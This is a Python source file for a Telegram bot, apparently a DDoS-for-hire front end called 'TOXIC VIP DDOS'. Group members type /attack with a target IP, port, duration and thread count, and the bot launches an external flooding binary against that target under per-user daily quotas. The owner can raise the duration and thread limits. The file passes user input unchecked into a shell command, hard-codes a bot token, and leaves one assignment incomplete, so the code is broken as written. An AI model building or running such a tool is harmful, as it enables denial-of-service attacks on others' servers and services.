import os
import asyncio
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext

# Suppress HTTP request logs
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

# Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# Bot Configuration
TELEGRAM_BOT_TOKEN = '7578629842:AAFnUmkcvsa-F1sp0C7nL0O1Xl2PFvZR2Pc'  # Replace with your bot token
OWNER_USERNAME =   # Replace with your Telegram username (without @)
ALLOWED_GROUP_ID = -1002431196846  # Replace with your allowed group ID
MAX_THREADS = 1000  # Default max threads
max_duration = 120  # Default max attack duration
daily_attack_limit = 150

# Attack & Feedback System
attack_running = False
user_attacks = {}
feedback_waiting = {}
attack_ban_list = {}

# Check if bot is used in the allowed group
def is_allowed_group(update: Update):
    chat = update.effective_chat
    return chat.type in ['group', 'supergroup'] and chat.id == ALLOWED_GROUP_ID

# Start Command
async def start(update: Update, context: CallbackContext):
    if not is_allowed_group(update):
        return

    user_id = update.effective_user.id
    if user_id not in user_attacks:
        user_attacks[user_id] = daily_attack_limit

    message = (
        "*🔥 Welcome to the TOXIC VIP DDOS 🔥*\n\n"
        "*Use /attack <ip> <port> <duration> <threads>*\n\n"
        f"⚔️ *You have {user_attacks[user_id]} attacks left today!* ⚔️\n\n"
       
    )

    await update.message.reply_text(text=message, parse_mode='Markdown')

# Attack Command
async def attack(update: Update, context: CallbackContext):
    global attack_running
    if not is_allowed_group(update):
        return

    user_id = update.effective_user.id

    if user_id in attack_ban_list:
        await update.message.reply_text("❌ *You are banned from using the attack command for 10 minutes!*", parse_mode='Markdown')
        return

    if attack_running:
        await update.message.reply_text("⚠️ *Please wait! Another attack is already running.*", parse_mode='Markdown')
        return

    if user_id not in user_attacks:
        user_attacks[user_id] = daily_attack_limit

    if user_attacks[user_id] <= 0:
        await update.message.reply_text("❌ *You have used all your daily attacks!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 4:
        await update.message.reply_text("⚠️ *Usage: /attack <ip> <port> <duration> <threads>*", parse_mode='Markdown')
        return

    ip, port, duration, threads = args
    duration = int(duration)
    threads = int(threads)

    if duration > max_duration:
        await update.message.reply_text(f"❌ *Attack duration exceeds the max limit ({max_duration} sec)!*", parse_mode='Markdown')
        return

    if threads > MAX_THREADS:
        await update.message.reply_text(f"❌ *Number of threads exceeds the max limit ({MAX_THREADS})!*", parse_mode='Markdown')
        return

    attack_running = True
    user_attacks[user_id] -= 1
    remaining_attacks = user_attacks[user_id]

    feedback_waiting[user_id] = True

    await update.message.reply_text(
        f"⚔️ *Attack Started!*\n"
        f"🎯 *Target*: {ip}:{port}\n"
        f"🕒 *Duration*: {duration} sec\n"
        f"🧵 *Threads*: {threads}\n"
        f"🔥 *Let the battlefield ignite! 💥*\n\n"
        f"💥 *You have {remaining_attacks} attacks left today!*\n\n"
        "📸 *Please send a photo feedback before the attack completes, or you will be banned for 10 minutes!*",
        parse_mode='Markdown'
    )

    asyncio.create_task(run_attack(update.effective_chat.id, ip, port, duration, threads, context, user_id))

# Run Attack in Background
async def run_attack(chat_id, ip, port, duration, threads, context, user_id):
    global attack_running
    try:
        process = await asyncio.create_subprocess_shell(
            f"./RAJ {ip} {port} {duration} {threads}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        try:
            await asyncio.wait_for(process.communicate(), timeout=duration + 10)
        except asyncio.TimeoutError:
            process.kill()
            await context.bot.send_message(chat_id=chat_id, text="⚠️ *Attack process timed out!*", parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Error during attack: {e}")
        await context.bot.send_message(chat_id=chat_id, text="❌ *An error occurred during the attack!*", parse_mode='Markdown')

    finally:
        attack_running = False
        if feedback_waiting.get(user_id):
            await context.bot.send_message(chat_id=chat_id, text=f"❌ *You didn't send feedback! You are banned from using the attack command for 10 minutes!*", parse_mode='Markdown')
            attack_ban_list[user_id] = True
            asyncio.create_task(unban_user_after_delay(user_id, 600))
        else:
            await context.bot.send_message(chat_id=chat_id, text="✅ *Attack Finished, now next attack!*", parse_mode='Markdown')

# Unban user after delay
async def unban_user_after_delay(user_id, delay):
    await asyncio.sleep(delay)
    attack_ban_list.pop(user_id, None)

# Handle Photo Feedback
async def handle_photo(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in feedback_waiting:
        del feedback_waiting[user_id]
        await update.message.reply_text("✅ *Thanks for your feedback!*", parse_mode='Markdown')

# Reset User Attacks
async def reset_attacks(update: Update, context: CallbackContext):
    if update.effective_user.username != OWNER_USERNAME:
        await update.message.reply_text("❌ *Only the owner can reset attacks!*", parse_mode='Markdown')
        return

    for user_id in user_attacks:
        user_attacks[user_id] = daily_attack_limit

    await update.message.reply_text(f"✅ *All users' attack limits have been reset to {daily_attack_limit}!*")

# Set Maximum Attack Duration
async def set_duration(update: Update, context: CallbackContext):
    global max_duration

    if update.effective_user.username != OWNER_USERNAME:
        await update.message.reply_text("❌ *Only the owner can set max attack duration!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1 or not args[0].isdigit():
        await update.message.reply_text("⚠️ *Usage: /setduration <max_duration_sec>*", parse_mode='Markdown')
        return

    max_duration = int(args[0])
    await update.message.reply_text(f"✅ *Maximum attack duration set to {max_duration} seconds!*")

# Set Maximum Threads
async def set_threads(update: Update, context: CallbackContext):
    global MAX_THREADS

    if update.effective_user.username != OWNER_USERNAME:
        await update.message.reply_text("❌ *Only the owner can set max threads!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1 or not args[0].isdigit():
        await update.message.reply_text("⚠️ *Usage: /set_threads <max_threads>*", parse_mode='Markdown')
        return

    MAX_THREADS = int(args[0])
    await update.message.reply_text(f"✅ *Maximum threads set to {MAX_THREADS}!*")

# Main Bot Setup
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("resetattacks", reset_attacks))
    application.add_handler(CommandHandler("setduration", set_duration))
    application.add_handler(CommandHandler("set_threads", set_threads))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))

    application.run_polling()

if __name__ == '__main__':
    main()
